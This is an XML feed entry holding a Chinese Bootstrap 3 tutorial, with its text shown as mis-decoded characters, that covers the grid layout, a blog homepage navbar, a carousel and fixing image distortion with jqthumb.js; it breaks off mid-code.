        
    </entry>
    
    <entry>
      <title><![CDATA[BootStrapå­¦ä¹ ç¬”è®°]]></title>
      <url>/2016/08/29/BootStrap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="BootStrapæ˜¯ä»€ä¹ˆ"><a href="#BootStrapæ˜¯ä»€ä¹ˆ" class="headerlink" title="BootStrapæ˜¯ä»€ä¹ˆ"></a>BootStrapæ˜¯ä»€ä¹ˆ</h1><p>BootStrapæ˜¯åŸºäºHTMLã€CSSå’ŒJavaScriptçš„æ¡†æ¶ï¼Œä½¿ä½ åªéœ€è¦å†™ç®€å•çš„ä»£ç å°±å¯ä»¥å¾ˆå¿«çš„æ­å»ºä¸€ä¸ªè¿˜ä¸é”™çš„å‰ç«¯ç•Œé¢ï¼Œå®ƒæ˜¯åç«¯ç¨‹åºå‘˜çš„ç¦éŸ³ï¼Œä½¿ä»–ä»¬åªéœ€è¦ä¸“æ³¨ä¸šåŠ¡é€»è¾‘ï¼Œè€Œæ— é¡»æµªè´¹å¤ªå¤šçš„ç²¾åŠ›åœ¨ç•Œé¢è®¾è®¡ä¸Šã€‚</p>
<a id="more"></a>
<p><strong>å…¨å“åº”</strong></p>
<p>å®ƒå¯ä»¥å¼€å‘å…¨å“åº”å¼ç½‘é¡µâ€”â€”ä¸è®ºä½ ä½¿ç”¨æ‰‹æœºã€å¹³æ¿ç”µè„‘ã€æ™®é€šä¸ªäººç”µè„‘æµè§ˆç½‘ç«™å†…å®¹ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å¯ä»¥å¾ˆä¼˜é›…çš„å‘ˆç°ï¼Œå‡è½»äº†å› ä¸ºå…¼å®¹æ€§è€Œå¸¦æ¥çš„å·¥ä½œé‡ã€‚</p>
<p><strong>ç‰ˆæœ¬</strong></p>
<p>å®ƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯4.0ï¼Œå›½å†…ç›®å‰ç”¨çš„è¾ƒå¤šçš„æ˜¯3.x,æœ¬æ•™ç¨‹ä¹ŸåŸºäºBootStrap3.xç‰ˆæœ¬ã€‚</p>
<p><strong>äºŒæ¬¡å¼€å‘</strong></p>
<p>ä½ å¯ä»¥ä½¿ç”¨é»˜è®¤çš„BootStrapæ ·å¼ã€ç»„ä»¶å’Œæ’ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œç”šè‡³ä½ è¿˜å¯ä»¥åŸºäºBootStrapç¯å¢ƒä½¿ç”¨è‡ªå·±å¼€å‘çš„ç»„ä»¶ã€‚</p>
<p>ä½ å¯ä»¥ç™»é™†<code>http://v3.bootcss.com</code>ç‚¹å‡»é¡µé¢ä¸­çš„<code>ä¸‹è½½BootStrap</code>æŒ‰é’®ä¸‹è½½å®Œæ•´ç‰ˆã€‚</p>
<p>1.é¦–å…ˆæŠŠå®ƒçš„æ–‡ä»¶æŒ‰ç…§ç±»åˆ«æ”¾åœ¨é¡¹ç›®çš„æ–‡ä»¶å¤¹ä¸­</p>
<p>ä½ å¯ä»¥æŠŠCSSæ–‡ä»¶â€”â€”bootstrap.min.cssæ”¾åœ¨ç±»ä¼¼stylesheetsè¿™æ ·ä¸“é—¨æ”¾CSSçš„æ–‡ä»¶å¤¹ã€‚æŠŠjsæ–‡ä»¶â€”â€”bootstrap.min.jsæ”¾åœ¨ç±»ä¼¼Scriptsæ–‡ä»¶å¤¹ä¸­ã€‚å½“ç„¶ï¼Œæœ€ç»ˆå¦‚ä½•éƒ¨ç½²å¯ä»¥æŒ‰ç…§ä½ çš„ä¸ªäººå–œå¥½ã€‚</p>
<p>2.åœ¨é¡µé¢ä¸­ä½¿ç”¨BootStrap</p>
<p>å°†BootStrapçš„æ–‡ä»¶bootstrap.min.cssã€bootstrap.min.jså¼•å…¥å½“å‰é¡µé¢ä¸­ï¼Œç”±äºBootStrapæ˜¯åŸºäºJqueryçš„ï¼Œæ‰€ä»¥åœ¨å¼•å…¥å®ƒçš„jsæ–‡ä»¶ä¹‹å‰ï¼Œä¸€å®šè¦å…ˆå¼•å…¥Jquery.jsã€‚æ³¨æ„ï¼šè¿™é‡Œè€ƒè™‘åˆ°æ–‡ä»¶å¤§å°ï¼Œæˆ‘ä»¬å¼•å…¥äº†minç‰ˆçš„æ–‡ä»¶ï¼Œå½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å¼•å…¥å®Œæ•´ç‰ˆçš„æ–‡ä»¶ã€‚</p>
<p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;!-- Bootstrap æ ¸å¿ƒ CSS æ–‡ä»¶ --&gt;&lt;/p&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/bootstrap.min.css&quot;&gt;

&lt;!-- jQueryæ–‡ä»¶ --&gt;
&lt;script src=&quot;/scripts/jquery.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- Bootstrap æ ¸å¿ƒ JavaScript æ–‡ä»¶ --&gt;
&lt;p&gt;&lt;script src=&quot;/scripts/bootstrap.min.js&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="BootStrapæ …æ ¼å¸ƒå±€"><a href="#BootStrapæ …æ ¼å¸ƒå±€" class="headerlink" title="BootStrapæ …æ ¼å¸ƒå±€"></a>BootStrapæ …æ ¼å¸ƒå±€</h2><p>BootStrapæ …æ ¼å¸ƒå±€æ˜¯çµæ´»ä½¿ç”¨BootStrapçš„åŸºç¡€ã€‚BootStrapå°†å±å¹•åˆ†ä¸º12ç­‰åˆ†ï¼Œåœ¨å…·ä½“çš„DIVä¸­ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®DIVçš„æ‰€å ç­‰åˆ†çš„æ•°å­—ç¡®å®šå…¶åœ¨å±å¹•ä¸­å æœ‰çš„å®½åº¦ã€‚å¦‚ï¼š</p>
<pre><code>&lt;div class=&quot;rowâ€œ&gt;&lt;!--è¡¨ç¤ºå¦èµ·ä¸€è¡Œ--&gt;
      &lt;div class=&quot;col-md-8&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt;
      &lt;div class=&quot;col-md-4&quot; style=&quot;border:1px solid black;height:100px;&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>åœ¨ç¬¬ä¸€ä¸ªDIVä¸­<code>class=&quot;col-md-8&quot;</code>,ç¬¬äºŒä¸ªDIVä¸­<code>class=&quot;col-md-4&quot;</code>, å…¶ä¸­â€˜8â€™å’Œâ€˜4â€™å°±æ˜¯å…¶DIVæ‰€å å±å¹•å®½åº¦çš„æ•°å€¼ï¼ŒåŠ åœ¨ä¸€èµ·ç­‰äºâ€˜12â€™ã€‚ä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªDIVå æ•´ä¸ªå±å¹•å®½åº¦çš„â€˜8/12â€™,ç¬¬äºŒä¸ªDIVå â€˜4/12â€™ã€‚ æ³¨ï¼šåœ¨ä¸Šè¿°ä»£ç ä¸­ä¸ºäº†çªæ˜¾åŒºå—ï¼Œæˆ‘ä»¬è®¾ç½®äº†DIVçš„è¾¹æ¡†å®½åº¦ä¸º1åƒç´ é»‘è‰²å®çº¿ï¼Œé«˜åº¦è®¾ä¸º100åƒç´ ã€‚</p>
<h2 id="å¸ƒå±€å±å¹•åˆ†ç±»"><a href="#å¸ƒå±€å±å¹•åˆ†ç±»" class="headerlink" title="å¸ƒå±€å±å¹•åˆ†ç±»"></a>å¸ƒå±€å±å¹•åˆ†ç±»</h2><p>BootStrapæ˜¯ä¸€ç§å…¨å“åº”çš„æŠ€æœ¯ï¼Œé‚£ä¹ˆé’ˆå¯¹ä¸åŒçš„å±å¹•ï¼Œå®ƒæ˜¯æ€ä¹ˆæä¾›æ”¯æŒçš„å‘¢ï¼Ÿ åˆ«æ‹…å¿ƒï¼Œé’ˆå¯¹ä¸åŒçš„æ˜¾ç¤ºå±å¹•å°ºå¯¸ï¼ŒBootStrapæä¾›äº†ä¸åŒçš„æ …æ ¼å¸ƒå±€çš„å±æ€§ï¼š</p>
<ol>
<li>col-xs-* è¶…å°å±å¹• æ‰‹æœº (&lt;768px)</li>
<li>col-sm-* å°å±å¹• å¹³æ¿ (â‰¥768px)</li>
<li>col-md-* ä¸­ç­‰å±å¹• æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥992px)</li>
<li>col-lg-* å¤§å±å¹• å¤§æ¡Œé¢æ˜¾ç¤ºå™¨ (â‰¥1200px)</li>
</ol>
<h2 id="å¤šä¸ªå¸ƒå±€å±æ€§"><a href="#å¤šä¸ªå¸ƒå±€å±æ€§" class="headerlink" title="å¤šä¸ªå¸ƒå±€å±æ€§"></a>å¤šä¸ªå¸ƒå±€å±æ€§</h2><p>å¦‚æœæƒ³è®©ä¸€ä¸ªDIVåœ¨ä¸åŒçš„å±å¹•ä¸­å æœ‰ä¸åŒçš„å±å®½è¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ BootStrapå…è®¸æˆ‘ä»¬åœ¨ä¸€ä¸ªDIVä¸­å†™å¤šä¸ªç±»åˆ«çš„å¸ƒå±€å±æ€§ï¼Œä»è€Œè®©è¯¥DIVåœ¨ä¸åŒçš„å±å¹•ä¸­å‘ˆç°ä¸åŒçš„å±å®½ã€‚å¦‚ï¼š</p>
<pre><code>&lt;div class=&quot;row&quot;&gt;
      &lt;div class=&quot;col-md-8 col-xs-6 col-lg-4&quot;&gt;&lt;/div&gt;
&lt;/div&gt;
</code></pre><p>è¯¥DIVåœ¨ä¸­ç­‰å±å¹•ä¸­å æœ‰â€˜8/12â€™ï¼Œåœ¨æ‰‹æœºä¸­å æœ‰â€˜6/12â€™ï¼Œåœ¨å¤§å±å¹•ä¸­å æœ‰å±å¹•æ¯”ä¾‹çš„â€˜4/12â€™ã€‚</p>
<h1 id="ç½‘ç«™é¦–é¡µæ•´ä½“è®¾è®¡æ€è·¯"><a href="#ç½‘ç«™é¦–é¡µæ•´ä½“è®¾è®¡æ€è·¯" class="headerlink" title="ç½‘ç«™é¦–é¡µæ•´ä½“è®¾è®¡æ€è·¯"></a>ç½‘ç«™é¦–é¡µæ•´ä½“è®¾è®¡æ€è·¯</h1><h2 id="æ•´ä½“æ¶æ„"><a href="#æ•´ä½“æ¶æ„" class="headerlink" title="æ•´ä½“æ¶æ„"></a>æ•´ä½“æ¶æ„</h2><p>ä¸€èˆ¬è€Œè¨€é¦–é¡µè®¾è®¡å‡ ä¹ç­‰åŒä¸æ•´ä¸ªç½‘ç«™è®¾è®¡ï¼Œé‚£ä¹ˆé¦–é¡µä¸­åˆ°åº•åº”è¯¥æ”¾äº›ä»€ä¹ˆå†…å®¹æ‰å¥½å‘¢ï¼Ÿè¿™è¦çœ‹ç½‘ç«™æœ‰å“ªäº›ä¸»è¦çš„å…ƒç´ ã€‚æœ¬æ•™ç¨‹é‡Œè¦è®¾è®¡çš„ç½‘ç«™é¦–é¡µæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·åšå®¢ç±»çš„ç½‘ç«™é¦–é¡µï¼Œåœ¨è¯¥ç½‘ç«™ä¸­ç”¨æˆ·å¯ä»¥å‘è¡¨åšå®¢ï¼Œä¹Ÿå¯ä»¥æ¨èå›¾ä¹¦ç»™å…¶ä»–ç”¨æˆ·ã€‚æ‰€ä»¥ï¼Œé¦–é¡µä¸­çš„æ¿å—åŒ…æ‹¬è¿™äº›åº”è¯¥æ˜¯æ°å½“çš„ï¼š</p>
<ul>
<li><p>æ•´ç«™å¯¼èˆªæ¡</p>
</li>
<li><p>æ–‡ç« ï¼ˆåšå®¢ï¼‰å±•ç¤ºæ¿å—</p>
</li>
<li><p>å›¾ä¹¦å±•ç¤ºæ¿å—</p>
</li>
<li><p>ç”¨æˆ·ï¼ˆä¼šå‘˜ï¼‰å±•ç¤ºæ¿å—</p>
</li>
<li><p>è„šæ³¨â€”â€”footeréƒ¨åˆ†</p>
</li>
</ul>
<p>å…¶ä¸­å¯¼èˆªæ¡å’Œè„šæ³¨æ˜¯æ•´ä¸ªç½‘ç«™ä¸­éƒ½è¦ç”¨åˆ°çš„ï¼Œå…·ä½“å®ç°æ—¶å¯ä»¥æ”¾åœ¨å¸ƒå±€æ¨¡æ¿ä¸­ã€‚</p>
<h2 id="æ¿å—åˆ’åˆ†"><a href="#æ¿å—åˆ’åˆ†" class="headerlink" title="æ¿å—åˆ’åˆ†"></a>æ¿å—åˆ’åˆ†</h2><p>æ ¹æ®ä¸Šé¢çš„æ•´ä½“æ¶æ„ï¼Œæˆ‘ä»¬å°†é¦–é¡µçš„æ¿å—åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªï¼š</p>
<p><strong>1.æ–‡ç« æ¿å—</strong>â€”â€”å°†æœ€æ–°ã€æœ€çƒ­çš„æ–‡ç« ä»¥æ ‡ç­¾é¡µï¼ˆtabï¼‰åˆ‡æ¢æ–¹å¼æ”¾åœ¨è¯¥æ¨¡å—ä¸­ï¼Œä¸ºäº†é¡µé¢ç¾è§‚ï¼Œå°†æœ‰å›¾ç‰‡çš„æ–‡ç« çš„ç¬¬ä¸€ç« å›¾ç‰‡æ”¾åœ¨è½®æ¢å›¾ç‰‡ï¼ˆcaourselï¼‰æ’ä»¶ä¸­,æœ€å³ä¾§æ”¾ç½®çƒ­é—¨æ–‡ç« åˆ†ç±»ã€‚</p>
<p><strong>2.å›¾ä¹¦æ¿å—</strong>â€”â€”æŒ‰ç…§å›¾ä¹¦çš„åˆ†ç±»å°†å›¾ä¹¦æ”¾åœ¨é¦–é¡µä¸­ï¼Œç‚¹å‡»ä¸åŒçš„åˆ†ç±»åˆ‡æ¢åˆ°ä¸åŒçš„é€‰é¡¹å¡ã€‚å›¾ä¹¦å±•ç¤ºä½¿ç”¨è‡ªå·±å¼€å‘çš„Jquery Tabæ’ä»¶ï¼Œå¹¶å°†å…¶æ•´åˆåˆ°BootStrapç¯å¢ƒä¸­ã€‚æœ€å³ä¾§åŒæ ·æ˜¯å›¾ä¹¦çš„åˆ†ç±»ã€‚</p>
<p><strong>3.ç”¨æˆ·æ¿å—</strong>â€”â€”å°†æ–°åŠ å…¥çš„ç”¨æˆ·å’Œå¯¹ç¤¾åŒºè´¡çŒ®æœ€å¤šçš„ç”¨æˆ·æ”¾åœ¨é¦–é¡µä¸­</p>
<h2 id="è¦ç”¨åˆ°çš„BootStrapå…ƒç´ "><a href="#è¦ç”¨åˆ°çš„BootStrapå…ƒç´ " class="headerlink" title="è¦ç”¨åˆ°çš„BootStrapå…ƒç´ "></a>è¦ç”¨åˆ°çš„BootStrapå…ƒç´ </h2><p>é‚£ä¹ˆï¼Œæˆ‘ä¹ˆè¦ç”¨åˆ°å“ªäº›BootStrapå…ƒç´ æ‰èƒ½å¾ˆå¥½çš„å±•ç¤ºæˆ‘ä»¬çš„æ¿å—å†…å®¹å‘¢ï¼Ÿ</p>
<p><strong>1.å¯¼èˆªæ¡</strong></p>
<p>è¿™é‡Œè¦ç”¨åˆ°å›ºå®šåœ¨ç½‘é¡µå¤´éƒ¨çš„å¯¼èˆªæ¡ï¼ˆ<code>navbar-fixed-top</code>ï¼‰,å¹¶åœ¨å…¶ä¸­æ•´åˆç”¨æˆ·ç™»å½•æ¨¡å—ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;div class=&quot;navbar navbar-inverse navbar-fixed-top&quot; role=&quot;navigation&quot;&gt;
       &lt;div class=&quot;container&quot;&gt;
         &lt;div class=&quot;navbar-header&quot;&gt;
          &lt;a class=&quot;navbar-brand active&quot; href=&quot;é¦–é¡µURL&quot;&gt;é¡¶æ±‚ç½‘&lt;/a&gt;
          &lt;a class=&quot;navbar-brand&quot; href=&quot;å›¾ä¹¦é¡µé¢URL&quot;&gt;å›¾ä¹¦&lt;/a&gt;
          &lt;a class=&quot;navbar-brand&quot; href=&quot;æ–‡ç« é¡µé¢URL&quot;&gt;æ–‡ç« &lt;/a&gt;
        &lt;/div&gt;
        &lt;div class=&quot;btn-group&quot; style=&quot;margin-top:10px; float:right;&quot;&gt;
            &lt;button type=&quot;button&quot; class=&quot;btn btn-default dropdown-toggle&quot; data-toggle=&quot;dropdown&quot;&gt;
          ä¼šå‘˜ç™»é™† &lt;span class=&quot;caret&quot;&gt;&lt;/span&gt;
            &lt;/button&gt;
            &lt;ul class=&quot;dropdown-menu&quot; role=&quot;menu&quot;&gt;
               &lt;LI&gt;&lt;a href=&quot;ä¼šå‘˜ç™»é™†é¡µé¢URL&quot;  target=&quot;_top&quot;&gt;ä¼šå‘˜ç™»é™†&lt;/a&gt;&lt;/LI&gt;
               &lt;LI&gt;&lt;a href=&quot;ä¼šå‘˜æ³¨å†Œé¡µé¢URL&quot;  target=&quot;_top&quot;&gt;ä¼šå‘˜æ³¨å†Œ&lt;/a&gt;&lt;/LI&gt;
            &lt;/ul&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
</code></pre><p><strong>2.æ–‡ç« æ¿å—éœ€è¦ç”¨åˆ°çš„BootStrapå…ƒç´ </strong></p>
<p>1.è½®æ¢å›¾ç‰‡æ’ä»¶ï¼ˆcaoursel)â€”â€”è§£å†³äº†å±•ç¤ºå›¾ç‰‡æ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜ã€‚</p>
<p>2.æ ‡ç­¾é¡µæ’ä»¶ï¼ˆtabsï¼‰â€”â€”å¯¹æ’ä»¶çš„æ ·å¼è¿›è¡Œäº†ç¾åŒ–ï¼Œå¹¶å¢åŠ äº†è‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½ã€‚</p>
<p>3.ä¿¡æ¯æŒ‰é’®ï¼ˆbtn-infoï¼‰ç»„ä»¶â€”â€”ç”¨å®ƒåˆ—å‡ºæ–‡ç« åˆ†ç±»ä¿¡æ¯ã€‚</p>
<p><strong>3.å›¾ä¹¦æ¿å—éœ€è¦ç”¨åˆ°çš„å…ƒç´ </strong></p>
<p>1.è‡ªå·±å¼€å‘çš„Jquery Tabæ’ä»¶</p>
<p>2.ç¼©ç•¥å›¾(thumbnail)ç»„ä»¶</p>
<p>3.åˆ†ç±»æ ‡ç­¾(ä»¿è±†ç“£)</p>
<p><strong>4.ç”¨æˆ·æ¿å—ç”¨åˆ°çš„BootStrapå…ƒç´ </strong></p>
<p>1.BootStrapåŸç”Ÿtab</p>
<p>2.åœ†å½¢å›¾ç‰‡ï¼ˆ<code>image_circle</code>ï¼‰</p>
<h1 id="æ–‡ç« æ¿å—çš„è®¾è®¡ä¸å®ç°"><a href="#æ–‡ç« æ¿å—çš„è®¾è®¡ä¸å®ç°" class="headerlink" title="æ–‡ç« æ¿å—çš„è®¾è®¡ä¸å®ç°"></a>æ–‡ç« æ¿å—çš„è®¾è®¡ä¸å®ç°</h1><h2 id="å¸ƒå±€"><a href="#å¸ƒå±€" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h2><p>æ€æ ·çš„å¸ƒå±€æ‰èƒ½è®©ç½‘ç«™ä¸­çš„æ–‡ç« ä»¥è¾ƒå¥½çš„å½¢å¼å‘ˆç°åœ¨é¦–é¡µä¸Šå‘¢ï¼Ÿæ—¢è¦ååº”æ›´æ–°ï¼Œåˆè¦æœ‰ç²¾åã€‚ç”±äºæ–‡ç« æ¿å—åœ¨é¦–é¡µä¸Šå¤„äºæœ€ä¸Šé¢çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼Œè€ƒè™‘ä½¿ç”¨è½®æ¢å›¾ç‰‡æ’ä»¶æ¥å¸å¼•çœ¼çƒï¼Œå¹¶ä¸”è¿˜éœ€è¦å±•ç¤ºæœ€æ–°çš„æ–‡ç« å’Œçƒ­é—¨æ–‡ç« ä»¥åŠæ–‡ç« åˆ†ç±»ã€‚åˆ’åˆ†å¦‚ä¸‹ï¼š</p>
<ol>
<li>å·¦éƒ¨â€”â€”è½®æ¢å›¾ç‰‡(carousel)å’Œæ–‡ç« åˆ—è¡¨(tabs)éƒ¨åˆ†ï¼Œå„å ä¸€åŠã€‚</li>
<li>å³éƒ¨â€”â€”æ–‡ç« åˆ†ç±»éƒ¨åˆ†ã€‚</li>
</ol>
<p>å·¦è¾¹å æ®ï¼ˆ8/12ï¼‰ï¼Œå³è¾¹å æ®ï¼ˆ4/12ï¼‰</p>
<p>å¸ƒå±€ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;!--æ¿å—çš„å·¦éƒ¨ï¼Œä½¿ç”¨panelï¼Œå æ®8/12--&gt;
&lt;div class=&quot;panel panel-default col-md-8&quot;&gt;
      &lt;!--è½®æ¢å›¾ç‰‡ï¼ˆcarouselï¼‰æ’ä»¶,å å·¦éƒ¨çš„ä¸€åŠ--&gt;
      &lt;div class=&quot;col-md-6&quot;&gt;
          &lt;div  class=&quot;carousel slide&quot; &gt;
          &lt;/div&gt;
       &lt;/div&gt;
    &lt;!--æ–‡ç« tabsï¼Œå å·¦éƒ¨çš„ä¸€åŠ--&gt;
      &lt;div class=&quot;noborder col-md-6&quot;&gt;
          &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt;
          &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;!--æ¿å—çš„å³éƒ¨ï¼Œä½¿ç”¨æ™®é€šçš„DIVï¼Œå æ®4/12--&gt;
&lt;div class=&quot;col-md-4&quot;&gt;
&lt;/div&gt;
</code></pre><h2 id="ä½¿ç”¨Carouselï¼ˆè½®æ¢å›¾ç‰‡ï¼‰æ’ä»¶"><a href="#ä½¿ç”¨Carouselï¼ˆè½®æ¢å›¾ç‰‡ï¼‰æ’ä»¶" class="headerlink" title="ä½¿ç”¨Carouselï¼ˆè½®æ¢å›¾ç‰‡ï¼‰æ’ä»¶"></a>ä½¿ç”¨Carouselï¼ˆè½®æ¢å›¾ç‰‡ï¼‰æ’ä»¶</h2><p>é¦–é¡µä¸­ä½¿ç”¨Carouselæ’ä»¶å¾€å¾€èƒ½è¾¾åˆ°å¸ç›çš„ç›®çš„ï¼Œæ˜¯ç”¨æ¥å±•ç¤ºå›¾æ–‡å†…å®¹çš„æœ€ä½³æ‰‹æ®µã€‚åœ¨é¡µé¢ä¸­ä½¿ç”¨carsouelæ’ä»¶å¾ˆå®¹æ˜“ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<p><strong>1.åœ¨DIVçš„classå±æ€§ä¸­åŠ å…¥carousel</strong></p>
<p>åŠ å…¥carouselåï¼Œè¯¥DIVå°±æ˜¯ä¸€ä¸ªè½®æ¢å›¾ç‰‡æ’ä»¶äº†</p>
<pre><code>&lt;div class=&quot;carousel slide&quot; data-ride=&quot;carousel&quot;&gt;

&lt;/div&gt;
</code></pre><p><strong>2.è®¾ç½®å†…å®¹åŒºï¼ˆcarsouel-innerï¼‰</strong></p>
<p>åœ¨ä¸Šè¿°DIVä¸­åŠ å…¥æ–°çš„DIVä½œä¸ºå…¶ä¸»ä½“å†…å®¹ï¼Œå…¶<code>class=&quot;carsouel-inner&quot;</code>ã€‚</p>
<pre><code>&lt;div class=&quot;carousel-inner&quot; role=&quot;listbox&quot;&gt;

&lt;/div&gt;
</code></pre><p><strong>3.åœ¨å†…å®¹åŒºä¸­æ”¾å…¥è¦å±•ç¤ºçš„å…ƒç´ ï¼ˆitemï¼‰</strong></p>
<pre><code>&lt;div class=&quot;item active&quot;&gt;
      &lt;a href=&quot;åŒ…å«å›¾ç‰‡æ–‡ç« è·¯å¾„&quot;&gt;
          &lt;img src=&quot;å›¾ç‰‡è·¯å¾„&quot; alt=&quot;å›¾ç‰‡ä¿¡æ¯&quot;/&gt;&lt;/a&gt;
          &lt;div class=&quot;carousel-caption&quot;&gt;
               &lt;h4 class=&quot;alpha&quot;&gt;
                   &lt;a style=&quot;color:white;&quot; href=&quot;åŒ…å«å›¾ç‰‡æ–‡ç« è·¯å¾„&quot;&gt;å›¾ç‰‡æ ‡é¢˜&lt;/a&gt;
               &lt;/h4&gt;
              &lt;/div&gt;

      &lt;/div&gt;
      &lt;!--å…¶ä»–item--&gt;
</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨å…ƒç´ åŒºä¸­åŒ…å«æ–‡ç« å±•ç¤ºä¿¡æ¯â€”â€”æ–‡å†…å›¾ç‰‡+æ ‡é¢˜+æŒ‡å‘æ–‡ç« çš„é“¾æ¥ã€‚</p>
<p><strong>4.æŒ‰é’®åŒºï¼ˆcarousel-controlï¼‰</strong></p>
<p>æœ€åæ”¾å…¥ï¼Œâ€œä¸Šä¸€ä¸ªâ€ï¼Œâ€œä¸‹ä¸€ä¸ªâ€æŒ‰é’®ï¼ˆå·¦å³ç®­å¤´ï¼‰ï¼Œç”¨äºç”¨æˆ·è‡ªä¸»åˆ‡æ¢ã€‚</p>
<pre><code>&lt;a class=&quot;left carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&gt;
    &lt;span class=&quot;glyphicon glyphicon-chevron-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;
    &lt;span class=&quot;sr-only&quot;&gt;Previous&lt;/span&gt;
&lt;/a&gt;
&lt;a class=&quot;right carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&gt;
&lt;span class=&quot;glyphicon glyphicon-chevron-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;sr-only&quot;&gt;Next&lt;/span&gt;
</code></pre><p><strong>å›¾ç‰‡å˜å½¢</strong></p>
<p>è¿è¡Œå³ä¾§çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡º,å½“ä¸åŒé•¿å®½æ¯”çš„å›¾ç‰‡è¯•å›¾å æ»¡å…ƒç´ (item)åŒºæ—¶ï¼Œå›¾ç‰‡å‘ç”Ÿäº†å˜å½¢ã€‚</p>
<h2 id="è§£å†³å±•ç¤ºæ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜"><a href="#è§£å†³å±•ç¤ºæ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜" class="headerlink" title="è§£å†³å±•ç¤ºæ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜"></a>è§£å†³å±•ç¤ºæ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜</h2><p>è¿è¡Œä¸ŠèŠ‚çš„ä»£ç æˆ‘ä»¬å‘ç°æ’ä»¶ä¸­çš„å›¾ç‰‡å‘ç”Ÿäº†å˜å½¢ï¼Œåˆ†æå…¶åŸå› ä¸ºï¼šè½®æ¢æ’ä»¶ä¸­çš„å›¾ç‰‡ä½¿ç”¨çš„æ–‡ç« ä¸­çš„ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡çš„å¤§å°ä¸ä¸€ï¼Œè€Œè½®æ’­æ’ä»¶çš„å¤§å°åŸºæœ¬æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å±•ç¤ºçš„æ—¶å€™å›¾ç‰‡å‡ºç°äº†å˜å½¢ã€‚ä¸‹é¢çœ‹çœ‹æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p>
<p><strong>1.å¼•å…¥Jqthumb.js</strong></p>
<p>åœ¨BootStrapä¸­æˆ‘ä»¬æ‰¾ä¸åˆ°è§£å†³åŠæ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ©å…¶å®ƒå·¥å…·ã€‚Jqthumbæ’ä»¶æ˜¯ä¸“é—¨ç”¨æ¥ä¸ºå›¾ç‰‡ç”Ÿæˆç¼©ç•¥å›¾çš„ï¼Œå®ƒå¯ä»¥ä»å›¾ç‰‡ä¸­çš„ä»»ä½•åæ ‡ç‚¹å¼€å§‹å–æŒ‡å®šå¤§å°çš„å›¾ç‰‡åŒºåŸŸä½œä¸ºå›¾ç‰‡çš„ç¼©ç•¥å›¾ã€‚ä½ å¯ä»¥ç‚¹å‡» <code>https://github.com/pakcheong/jqthumb</code> æ¥ä¸‹è½½å®ƒï¼Œå¹¶å°†å…¶åº”ç”¨åˆ°é¡¹ç›®ä¸­(å‡è®¾åœ¨å½“å‰é¡¹ç›®ä¸­ï¼Œjqthumb.jsæ”¾ç½®åœ¨scriptsæ–‡ä»¶å¤¹ä¸­):</p>
<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt;
</code></pre><p><strong>2.åœ¨å›¾ç‰‡åŠ è½½(onload)çš„æ—¶å€™è°ƒç”¨DrawImage()å‡½æ•°æ¥ç”Ÿæˆç¼©ç•¥å›¾</strong></p>
<p>DrawImage()å‡½æ•°æ­£æ˜¯åŸºäºjqthumb.jsåº“çš„ï¼Œæ³¨æ„è¯¥å‡½æ•°ä¸€å®šè¦å†™åœ¨è½®æ¢æ’ä»¶å‰ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»åœ¨å›¾ç‰‡åŠ è½½å‰ç”Ÿæˆç¼©ç•¥å›¾ã€‚DrawImage()å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;!--å¯¼å…¥æ’ä»¶--&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
function DrawImage(hotimg)
{
    $(hotimg).jqthumb({
    classname      : &apos;jqthumb&apos;,
            width          : &apos;100%&apos;,//å®½åº¦
            height         : &apos;300px&apos;,//é«˜åº¦
